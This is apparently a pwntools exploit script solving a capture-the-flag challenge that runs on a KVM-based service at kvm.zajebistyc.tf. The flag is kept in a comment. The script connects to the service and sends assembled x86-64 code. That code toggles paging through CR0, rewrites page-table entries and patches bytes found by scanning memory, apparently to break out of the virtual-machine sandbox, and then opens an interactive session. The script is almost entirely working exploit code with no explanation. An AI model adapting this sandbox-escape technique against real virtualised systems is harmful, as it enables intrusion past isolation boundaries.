from pwn import *

context.arch='amd64'

# p4{n0-35c4p3-fr0m-r4al1ty}

# 0x21b97
# 0x4f3c2
p = remote('kvm.zajebistyc.tf', 13402)

# 0x2d82b -- remote

code = '''mov rax, cr0
and eax, 0x7fffffff
mov cr0, rax

mov dx, 0x3f8
mov al, 0x3a
out dx, al
mov al, 0x3a
out dx, al
mov al, 0x29
out dx, al

mov edi, 0x7000
movb [edi+0x20], 0x03
movb [edi+0x21], 0x40
movb [edi+0x28], 0x03
movb [edi+0x29], 0x50
movb [edi+0x30], 0x03
movb [edi+0x31], 0x60
movb [edi+0x38], 0x03
movb [edi+0x39], 0x70

mov eax, 0x80050033
mov cr0, rax

mov edi, 0x7040
loop:
mov eax, [edi]
add edi, 2
test eax, eax
jz loop

sub edi, 2
add edi, 0x18

movb [edi], 0xc2
movb al, [edi+1]
movb bl, [edi+1]
add al, 0xd8
mov [edi+1], al
cmp al, bl
ja ck1
mov al, [edi+2]
inc al
mov [edi+2], al

ck1:
movb al, [edi+2]
movb bl, [edi+2]
add al, 0x2
mov [edi+2], al
cmp al, bl
ja ck2
mov al, [edi+3]
inc al
mov [edi+3], al

ck2:
mov dx, 0x3f8
mov al, 0x3a
out dx, al
mov al, 0x3a
out dx, al
mov al, 0x29
out dx, al

hlt
'''
z = asm(code)
p.send(p32(len(z)))
p.send(z)

p.interactive()
